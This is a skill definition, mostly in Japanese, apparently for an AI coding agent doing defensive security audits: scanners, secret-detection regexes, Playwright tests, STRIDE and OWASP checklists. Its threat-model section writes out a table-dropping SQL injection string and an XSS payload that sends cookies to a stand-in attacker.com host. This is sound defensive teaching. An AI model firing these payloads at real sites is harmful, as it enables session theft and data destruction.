---
name: security-audit
description: Comprehensive security analysis and vulnerability assessment. Use when performing security audits, risk assessments, threat modeling, or compliance verification. Specializes in OWASP Top 10, CWE pattern detection, and defensive security measures.
allowed-tools: Read, Grep, Edit, Bash, Serena, Playwright
---

# Security Audit (Hestia - Security Guardian)

## Purpose
このスキルは、システムの包括的なセキュリティ監査を実施し、脆弱性を特定・評価・修正します。最悪のシナリオを想定し、多層防御アプローチで徹底的な保護を提供します。

## When to use
- セキュリティ脆弱性の調査が必要な時
- OWASP Top 10準拠の確認が必要な時
- 脅威モデリングを実施する必要がある時
- コンプライアンス検証（GDPR、PCI-DSS等）が必要な時
- インシデント対応と影響評価が必要な時
- コードレビューでセキュリティ観点の評価が必要な時

## Instructions

### Phase 1: Static Analysis (静的解析)

1. **依存関係の脆弱性スキャン**
   ```bash
   # Python dependencies
   pip-audit
   safety check --json

   # Node.js dependencies
   npm audit --json
   yarn audit --json
   ```

2. **CWE パターン検出（Serena MCP活用）**
   ```python
   # 危険な関数の検索
   search_for_pattern(r"exec\(|eval\(|__import__", restrict_to_code=True)

   # SQL injection patterns
   search_for_pattern(r"execute\([\"'].*%s.*[\"']\)", restrict_to_code=True)

   # Hard-coded secrets
   search_for_pattern(r"password\s*=\s*['\"]|api_key\s*=\s*['\"]", restrict_to_code=True)
   ```

3. **静的コード解析ツール実行**
   ```bash
   # Bandit (Python)
   bandit -r src/ -f json -o security_report.json -ll

   # Semgrep (Multi-language)
   semgrep --config=auto --json -o findings.json src/

   # ESLint Security Plugin (JavaScript)
   eslint --ext .js,.jsx,.ts,.tsx src/ --plugin security
   ```

### Phase 2: Dynamic Analysis (動的解析)

4. **Playwright によるセキュリティテスト**
   ```javascript
   // XSS テスト
   await page.fill('input[name="search"]', '<script>alert("XSS")</script>');
   await page.click('button[type="submit"]');
   const html = await page.content();
   // Verify: スクリプトがエスケープされているか確認

   // CSRF テスト
   await page.goto('https://app.example.com/delete-account', {
       extraHTTPHeaders: {
           'Referer': 'https://attacker.com'
       }
   });
   // Verify: CSRF トークン検証が機能しているか確認

   // Authentication bypass テスト
   await page.goto('https://app.example.com/admin');
   // Verify: 未認証でアクセス拒否されるか確認
   ```

5. **認証・認可の検証**
   ```python
   # JWT トークンの検証
   find_symbol("create_access_token", include_body=True)
   # Check: exp claim, algorithm="HS256", SECRET_KEY management

   # パスワードハッシュの検証
   search_for_pattern(r"hash_password|bcrypt|argon2", restrict_to_code=True)
   # Verify: bcrypt or argon2 usage, no MD5/SHA1
   ```

### Phase 3: Threat Modeling (脅威モデリング)

6. **STRIDE 分析**
   - **Spoofing**: なりすまし攻撃の可能性
   - **Tampering**: データ改ざんの脆弱性
   - **Repudiation**: 否認可能な操作の存在
   - **Information Disclosure**: 情報漏洩リスク
   - **Denial of Service**: サービス妨害の可能性
   - **Elevation of Privilege**: 権限昇格の脆弱性

7. **最悪のシナリオ想定**
   ```markdown
   ## Scenario 1: SQL Injection → Data Breach
   - Entry Point: User input in search form
   - Attack Vector: `' OR '1'='1'; DROP TABLE users; --`
   - Impact: CRITICAL - Full database compromise
   - Mitigation: Parameterized queries, input validation

   ## Scenario 2: XSS → Session Hijacking
   - Entry Point: User-generated content display
   - Attack Vector: `<img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">`
   - Impact: HIGH - User session theft
   - Mitigation: Content Security Policy, output escaping
   ```

### Phase 4: Compliance Verification (コンプライアンス検証)

8. **OWASP Top 10 チェックリスト**
   - [ ] A01:2021 - Broken Access Control
   - [ ] A02:2021 - Cryptographic Failures
   - [ ] A03:2021 - Injection
   - [ ] A04:2021 - Insecure Design
   - [ ] A05:2021 - Security Misconfiguration
   - [ ] A06:2021 - Vulnerable and Outdated Components
   - [ ] A07:2021 - Identification and Authentication Failures
   - [ ] A08:2021 - Software and Data Integrity Failures
   - [ ] A09:2021 - Security Logging and Monitoring Failures
   - [ ] A10:2021 - Server-Side Request Forgery (SSRF)

9. **データ保護規制の確認**
   ```bash
   # PII (Personally Identifiable Information) の検出
   rg -i "email|phone|address|ssn|credit.*card" src/

   # GDPR 準拠の確認
   # - データ削除機能の実装確認
   # - 同意管理の実装確認
   # - データポータビリティの実装確認
   ```

### Phase 5: Reporting & Remediation (報告と修正)

10. **セキュリティレポート作成**
    ```markdown
    # セキュリティ監査レポート

    ## Executive Summary
    - 監査日: YYYY-MM-DD
    - スコープ: [対象システム]
    - 発見された脆弱性: Critical 3件, High 7件, Medium 12件, Low 5件

    ## Critical Findings

    ### V-1: SQL Injection in User Search (CWE-89)
    **Location**: src/api/search.py:42
    **Risk**: CRITICAL (CVSS 9.8)
    **Description**: User input directly concatenated into SQL query
    **Proof of Concept**:
    ```python
    query = f"SELECT * FROM users WHERE name = '{user_input}'"  # Vulnerable
    ```
    **Remediation**:
    ```python
    query = "SELECT * FROM users WHERE name = %s"
    cursor.execute(query, (user_input,))  # Safe
    ```
    **Timeline**: 修正期限 24時間以内
    ```

11. **修正の優先順位付けと追跡**
    | 脆弱性ID | CWE | 深刻度 | 対応期限 | 担当 | ステータス |
    |---------|-----|--------|---------|------|-----------|
    | V-1 | CWE-89 | CRITICAL | 24h | Artemis | 🚧 修正中 |
    | V-2 | CWE-79 | HIGH | 3d | Artemis | ⏳ 予定 |
    | V-3 | CWE-352 | HIGH | 3d | Eris | ⏳ 予定 |

## Scripts
- `scripts/security_scan.sh`: 自動脆弱性スキャン（Bandit, Semgrep, npm audit統合）
- `scripts/threat_model_generator.py`: STRIDE分析の自動生成
- `scripts/compliance_checker.py`: OWASP Top 10 準拠チェック

## Security Standards
- **OWASP Top 10**: すべての脆弱性カテゴリをカバー
- **CWE Top 25**: 最も危険なソフトウェア脆弱性に対応
- **SANS Top 25**: 最も危険なプログラミングエラーを防止
- **NIST Cybersecurity Framework**: Identify, Protect, Detect, Respond, Recover

## Risk Matrix
| 深刻度 | 悪用可能性 | 影響範囲 | 対応期限 | エスカレーション |
|-------|----------|---------|---------|----------------|
| CRITICAL | 即座に悪用可能 | システム全体 | 24時間以内 | 即座にユーザー報告 |
| HIGH | 悪用可能 | 重要データ | 3日以内 | 1時間以内にユーザー報告 |
| MEDIUM | 条件付き悪用 | 限定的 | 1週間以内 | 24時間以内に報告 |
| LOW | 理論的リスク | 影響なし | 次回リリース | 報告のみ |

## References
- `trinitas_sources/common/contexts/security.md`: セキュリティガイドライン
- `CLAUDE.md`: Rule 9（プログラミング作業規約）、Rule 11（プロジェクト固有セキュリティ規則）
- `docs/security/`: セキュリティベストプラクティス集
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/

---

*"Worst-case scenarios are not pessimism, but preparation. Security is not paranoia, but responsibility."*
